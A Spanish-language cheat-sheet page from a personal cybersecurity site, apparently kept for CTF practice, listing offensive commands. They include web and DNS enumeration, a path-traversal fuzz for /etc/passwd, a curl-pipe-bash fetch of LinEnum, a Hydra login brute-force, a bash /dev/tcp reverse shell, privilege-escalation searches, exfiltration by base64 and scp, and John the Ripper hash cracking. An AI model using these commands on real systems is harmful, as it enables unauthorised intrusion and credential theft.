<!DOCTYPE html><!-- Layout espec√≠fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si est√° disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a Apuntes
</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Hacks </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <p><strong>Actualizar kali</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> apt</span><span style="color:#F1FA8C"> update</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> apt</span><span style="color:#F1FA8C"> dist-upgrade</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> autoremove</span><span style="color:#BD93F9"> -y</span></span></code></pre>
<p><strong>Reconocimiento puertos y Exportar resultados en XML y texto:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> -oX</span><span style="color:#F1FA8C"> escaneo_nmap.xml</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
<p><strong>Convertir XML a HTML:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">xsltproc</span><span style="color:#F1FA8C"> target.xml</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> target.html</span></span></code></pre>
<h1 id="-enumeraci√≥n-web">üìÅ Enumeraci√≥n Web</h1>
<h2 id="directorios">Directorios</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Cambiar User-Agent</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://target.com</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -b</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">NO-STATU</span><span style="color:#F8F8F2">S</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --timeout</span><span style="color:#F1FA8C"> 15s</span><span style="color:#BD93F9"> -a</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Mozilla/5.0</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span><span style="color:#BD93F9"> -T</span><span style="color:#BD93F9"> 50</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">feroxbuster</span><span style="color:#BD93F9"> --url</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -s</span><span style="color:#BD93F9"> 301</span><span style="color:#BD93F9"> --scan-dir-listings</span><span style="color:#BD93F9"> --depth</span><span style="color:#BD93F9"> 8</span></span>
<span class="line"></span></code></pre>
<h2 id="subdominios">Subdominios</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://target.com</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /path/list/list.txt</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 70</span><span style="color:#BD93F9"> --append-domain</span><span style="color:#BD93F9"> --xs</span><span style="color:#F1FA8C"> 301,400</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dns</span><span style="color:#BD93F9"> -do</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.soulmate.htb</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="color:#BD93F9"> -fw</span><span style="color:#BD93F9"> 4</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -ac</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">dnsrecon</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -n</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> brt</span><span style="color:#BD93F9"> -D</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hl=1</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.dominio.com</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<h2 id="par√°metros">Par√°metros</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">arjun</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> https://172.17.0.2:5000/login</span><span style="color:#F8F8F2"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hl=1</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.&#x3C;DOMINIO></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hw</span><span style="color:#BD93F9"> 169</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">http://&#x3C;IP>/index.php?FUZZ=../../../../../../../../../etc/passwd</span><span style="color:#E9F284">'</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># GET</span></span>
<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/get.php?x=FUZZ</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/common.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># POST</span></span>
<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/post.php</span><span style="color:#BD93F9"> -X</span><span style="color:#F1FA8C"> POST</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Content-Type: application/x-www-form-urlencoded</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -d</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">y=FUZZ</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/common.txt</span><span style="color:#BD93F9"> -mc</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -v</span></span>
<span class="line"></span></code></pre>
<h2 id="virtual-hosts">Virtual Hosts</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style="color:#BD93F9"> --append-domain</span><span style="color:#BD93F9"> -r</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://target.com</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /path/list/list.txt</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 70</span><span style="color:#BD93F9"> --append-domain</span><span style="color:#BD93F9"> --xs</span><span style="color:#F1FA8C"> 301,400</span></span>
<span class="line"></span></code></pre>
<h2 id="inspecci√≥n-de-headers-y-recursos">Inspecci√≥n de headers y recursos</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#BD93F9"> -I</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Ver detalles de la transacci√≥n</span></span>
<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -v</span><span style="color:#F1FA8C"> https://example.com</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Deshabilitar verificaci√≥n SSL</span></span>
<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -k</span><span style="color:#F1FA8C"> https://example.com</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Descarga sin archivos con cURL, lo ejecutamos de inmediato:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#F1FA8C"> https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> bash</span></span>
<span class="line"></span></code></pre>
<h2 id="revisi√≥n-de-javascript-expuesto">Revisi√≥n de JavaScript expuesto</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#BD93F9"> -r</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -i</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">api\|key\|admin</span><span style="color:#E9F284">"</span><span style="color:#BD93F9;font-style:italic"> *</span><span style="color:#F1FA8C">.js</span></span></code></pre>
<hr>
<h1 id="Ô∏è-herramientas-de-enumeraci√≥n">üõ†Ô∏è Herramientas de Enumeraci√≥n</h1>
<h2 id="linpeas">linPEAS</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#F1FA8C"> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#F1FA8C"> https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><span style="color:#BD93F9"> -O</span><span style="color:#F1FA8C"> les.sh</span></span>
<span class="line"><span style="color:#6272A4"># https://github.com/The-Z-Labs/linux-exploit-suggester</span></span>
<span class="line"></span></code></pre>
<h2 id="hydra">Hydra</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">hydra</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 64</span><span style="color:#BD93F9"> -l</span><span style="color:#F1FA8C"> admin</span><span style="color:#BD93F9"> -P</span><span style="color:#F1FA8C"> /usr/share/wordlists/rockyou.txt</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> http-post-form</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">/my_weblog/admin.php:username=admin&#x26;password=^PASS^:Incorrect username or password.</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<h2 id="reverse-shell">Reverse Shell</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">bash</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bash -i>&#x26;/dev/tcp/&#x3C;IP>/&#x3C;PORT> 0>&#x26;1</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<h1 id="Ô∏è-post-explotaci√≥n-y-tty">üñ•Ô∏è Post-Explotaci√≥n y TTY</h1>
<p><strong>Mejorar shell TTY:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">script</span><span style="color:#F1FA8C"> /dev/null</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Ctrl+Z</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">stty</span><span style="color:#F1FA8C"> raw</span><span style="color:#BD93F9"> -echo</span><span style="color:#F8F8F2">; </span><span style="color:#8BE9FD">fg</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">reset</span><span style="color:#F1FA8C"> xterm</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">stty</span><span style="color:#F1FA8C"> rows</span><span style="color:#BD93F9"> 62</span><span style="color:#F1FA8C"> columns</span><span style="color:#BD93F9"> 248</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> TERM</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">xterm</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELL</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Otra forma</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">import pty; pty.spawn("/bin/bash")</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2"> </span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<hr>
<h2 id="hoja-de-ruta-de-comandos-ctf-por-nivel-de-avance">Hoja de Ruta de Comandos CTF por Nivel de Avance</h2>
<h3 id="nivel-1-reconocimiento-inicial-r√°pido-looting-b√°sico">Nivel 1: Reconocimiento Inicial R√°pido (Looting B√°sico)</h3>
<p>Comandos de impacto bajo y alta ganancia para establecer el contexto y el entorno.</p>
<ul>
<li>
<p><code>whoami</code></p>
</li>
<li>
<p><code>id</code></p>
</li>
<li>
<p><code>hostnamectl</code></p>
</li>
<li>
<p><code>uname -a</code></p>
</li>
<li>
<p><code>cat /etc/os-release</code></p>
</li>
<li>
<p><code>history</code></p>
</li>
<li>
<p><code>echo $PATH</code></p>
</li>
<li>
<p><code>env</code></p>
</li>
<li>
<p><code>ip a</code></p>
</li>
<li>
<p><code>ss -tulnp | grep LISTEN</code></p>
</li>
<li>
<p><code>w</code> o <code>who</code></p>
</li>
</ul>
<hr>
<h3 id="nivel-2-enumeraci√≥n-profunda-b√∫squeda-de-rutas-de-escalada">Nivel 2: Enumeraci√≥n Profunda (B√∫squeda de Rutas de Escalada)</h3>
<p>An√°lisis de permisos, archivos cr√≠ticos, servicios y posibles fallas de configuraci√≥n.</p>
<ul>
<li>
<p><code>sudo -v</code></p>
</li>
<li>
<p><code>sudo -l</code></p>
</li>
<li>
<p><code>sudo -V | head -n1</code></p>
</li>
<li>
<p><code>grep "sh$" /etc/passwd</code></p>
</li>
<li>
<p><code>getent group sudo</code></p>
</li>
<li>
<p><code>cat /etc/crontab</code></p>
</li>
<li>
<p><code>ps aux</code></p>
</li>
<li>
<p><code>lsof -i</code></p>
</li>
<li>
<p><code>env | grep -i key</code></p>
</li>
<li>
<p><code>find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null</code></p>
</li>
<li>
<p><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></p>
</li>
<li>
<p><code>ls -alR /home</code></p>
</li>
<li>
<p><code>ls -la /var/backups</code></p>
</li>
</ul>
<hr>
<h3 id="nivel-3-vulnerabilidades-y-t√°cticas-de-explotaci√≥n">Nivel 3: Vulnerabilidades y T√°cticas de Explotaci√≥n</h3>
<p>Comandos enfocados en encontrar fallas de permisos y posibles lugares para escribir <em>shells</em>.</p>
<ul>
<li>
<p><code>find / -type f -perm -4000 -user root 2>/dev/null</code></p>
</li>
<li>
<p><code>find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null</code> (M√°s completo que el anterior)</p>
</li>
<li>
<p><code>find / -writable -type d 2>/dev/null</code></p>
</li>
<li>
<p><code>ls -alt /tmp</code></p>
</li>
<li>
<p><code>tail -f /var/log/auth.log</code></p>
</li>
</ul>
<hr>
<h3 id="nivel-4-manejo-de-archivos-y-post-explotaci√≥n">Nivel 4: Manejo de Archivos y <em>Post-Explotaci√≥n</em></h3>
<p>Comandos √∫tiles para la exfiltraci√≥n, transferencia o decodificaci√≥n de datos una vez se ha obtenido acceso.</p>
<ul>
<li>
<p><code>php -S 0.0.0.0:8000</code> (Servidor web temporal)</p>
</li>
<li>
<p><code>ruby -run -ehttpd . -p8000</code> (Servidor web temporal)</p>
</li>
<li>
<p><code>scp usuario@host:/ruta/archivo /ruta/local</code> (Descarga)</p>
</li>
<li>
<p><code>scp /ruta/archivo usuario@host:/ruta/remota</code> (Subida)</p>
</li>
<li>
<p><code>md5sum &#x3C;ARCHIVO></code></p>
</li>
<li>
<p><code>cat &#x3C;ARCHIVO> | base64 -w 0;echo</code> (Codificaci√≥n)</p>
</li>
<li>
<p><code>echo -n '&#x3C;ARCHIVO CODIFICADO BASE64>' | base64 -d > &#x3C;NOMBRE NUEVO ARCHIVO></code> (Decodificaci√≥n)</p>
</li>
</ul>
<hr>
<h3 id="nivel-5-b√∫squeda-de-flags-t√©rmino-del-ctf">Nivel 5: B√∫squeda de Flags (T√©rmino del CTF)</h3>
<p>Comandos para encontrar los archivos <em>flag</em> una vez se tienen los permisos necesarios.</p>
<ul>
<li>
<p><code>find / -type f -name "user.txt" 2>/dev/null</code></p>
</li>
<li>
<p><code>find / -type f -name "root.txt" 2>/dev/null</code> (Asumiendo que se busca la <em>root flag</em>)</p>
</li>
<li>
<p><code>locate user.txt</code></p>
</li>
<li>
<p><code>grep -r "user.txt" / 2>/dev/null</code></p>
</li>
</ul>
<hr>
<h2 id="buscar-archivos-por-nombre">Buscar archivos por nombre</h2>
<p>Testear:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Extrae la ruta del request, la decodifica y devuelve solo el valor despu√©s de "/flag = "</span></span>
<span class="line"><span style="color:#50FA7B">grep</span><span style="color:#BD93F9"> -i</span><span style="color:#BD93F9"> -m1</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">flag</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C"> /var/log/apache2/access.log</span><span style="color:#FF79C6"> \</span></span>
<span class="line"><span style="color:#FF79C6">  |</span><span style="color:#50FA7B"> sed</span><span style="color:#BD93F9"> -n</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">s/.*GET \([^ ]*\) HTTP.*/\1/p</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> \</span></span>
<span class="line"><span style="color:#FF79C6">  |</span><span style="color:#50FA7B"> python3</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">import sys,urllib.parse as u,re</span></span>
<span class="line"><span style="color:#F1FA8C">s = u.unquote(sys.stdin.read().strip())</span></span>
<span class="line"><span style="color:#F1FA8C"># normaliza '+' a espacio por si acaso y busca '/flag = &#x3C;valor>'</span></span>
<span class="line"><span style="color:#F1FA8C">s = s.replace('+',' ')</span></span>
<span class="line"><span style="color:#F1FA8C">m = re.search(r'(?i)^/flag\s*=\s*(.*)', s)</span></span>
<span class="line"><span style="color:#F1FA8C">print(m.group(1) if m else s)</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<h1 id="-cracking-y-fuerza-bruta">üîë Cracking y Fuerza Bruta</h1>
<h2 id="local-john-the-ripper">Local (John The Ripper)</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --format=Raw-MD5</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">zip2john</span><span style="color:#F1FA8C"> archivo.zip</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> hashzip</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hashzip</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">keepass2john</span><span style="color:#F1FA8C"> Database.kdbx</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> hashkeepass</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hashkeepass</span></span>
<span class="line"></span></code></pre>
<hr>
<hr>
<h2 id="utilidades">Utilidades</h2>
<p>Recopilaci√≥n de sistema (Bash)</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4">#!/bin/bash</span></span>
<span class="line"><span style="color:#6272A4"># sys_info.sh ‚Äî Recolecta informaci√≥n clave del sistema (modo solo lectura)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD93F9">OUT</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">sysinfo.txt</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Auditor√≠a del sistema iniciada: $(</span><span style="color:#50FA7B">date</span><span style="color:#F1FA8C">)</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> ></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">[*] Usuario actual: $(</span><span style="color:#50FA7B">whoami</span><span style="color:#F1FA8C">)</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> >></span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$OUT</span><span style="color:#E9F284">"</span></span>
